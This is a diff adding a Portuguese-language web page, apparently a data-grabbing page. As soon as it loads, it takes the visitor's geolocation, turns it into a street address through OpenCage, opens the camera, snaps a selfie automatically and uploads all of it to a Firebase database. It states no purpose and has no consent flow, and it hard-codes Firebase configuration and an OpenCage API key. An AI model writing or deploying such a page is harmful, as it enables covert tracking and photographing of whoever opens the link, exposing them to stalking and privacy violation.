@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Captura de Dados e Envio para Firebase</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 20px;
+    }
+    #video {
+      width: 300px;
+      height: 200px;
+      border: 1px solid #ccc;
+      margin: 10px 0;
+    }
+    #canvas {
+      display: none;
+    }
+  </style>
+  <!-- Adicionando o Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+</head>
+<body>
+  <h1>Coleta e Envio de Dados</h1>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+  <script>
+    // Configuração do Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyAMr8ofwwXQMrR7E8VTEo8r3beEFSClt4k",
+      authDomain: "patos777-29172.firebaseapp.com",
+      databaseURL: "https://patos777-29172-default-rtdb.firebaseio.com/",
+      projectId: "patos777-29172",
+      storageBucket: "patos777-29172.appspot.com",
+      messagingSenderId: "43393892388",
+      appId: "1:43393892388:web:d031b834650c7eed4f98b1",
+      measurementId: "G-VWSF177CVP"
+    };
+
+    // Inicializa o Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Função para enviar dados para o Firebase
+    function sendDataToFirebase(data) {
+      const reference = database.ref('userData');
+      reference.push(data, function (error) {
+        if (error) {
+          alert('Erro ao enviar dados para o Firebase: ' + error);
+        } else {
+          alert('Dados enviados com sucesso para o Firebase!');
+        }
+      });
+    }
+
+    // Função para obter o endereço completo a partir das coordenadas
+    function getAddressFromCoordinates(lat, lon) {
+      const apiKey = '150e176e377d4d2ab2819ddada71dbe7'; // Chave de API OpenCage
+      const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.results.length > 0) {
+            const address = data.results[0].formatted;
+            alert('Endereço completo: ' + address);
+            sendDataToFirebase({
+              latitude: lat,
+              longitude: lon,
+              address: address,
+              selfie: null
+            });
+          } else {
+            alert('Endereço não encontrado');
+          }
+        })
+        .catch(error => {
+          alert('Erro ao obter o endereço: ' + error);
+        });
+    }
+
+    // Função para obter a localização do usuário
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const { latitude, longitude } = position.coords;
+          alert(`Localização obtida: Latitude ${latitude}, Longitude ${longitude}`);
+          getAddressFromCoordinates(latitude, longitude); // Obtém o endereço completo
+        }, error => {
+          alert('Erro ao obter a localização: ' + error.message);
+        });
+      } else {
+        alert('Geolocalização não é suportada pelo navegador.');
+      }
+    }
+
+    // Acessa a câmera do dispositivo
+    function startCamera() {
+      const video = document.getElementById('video');
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            captureSelfie(); // Captura a selfie automaticamente
+          })
+          .catch(error => {
+            alert('Erro ao acessar a câmera: ' + error.message);
+          });
+      } else {
+        alert('A câmera não é suportada pelo navegador.');
+      }
+    }
+
+    // Função para capturar a selfie automaticamente
+    function captureSelfie() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const selfieData = canvas.toDataURL('image/png');
+      alert('Selfie capturada!');
+      
+      // Enviar a selfie para o Firebase
+      sendDataToFirebase({
+        latitude: null,  // A localização será capturada separadamente
+        longitude: null,
+        address: null,
+        selfie: selfieData
+      });
+    }
+
+    // Inicia a captura dos dados
+    window.onload = () => {
+      alert('Página carregada. Iniciando a coleta de dados...');
+      getLocation(); // Captura a localização
+      startCamera(); // Inicia a câmera e captura a selfie
+    };
+  </script>
+</body>
+</html>
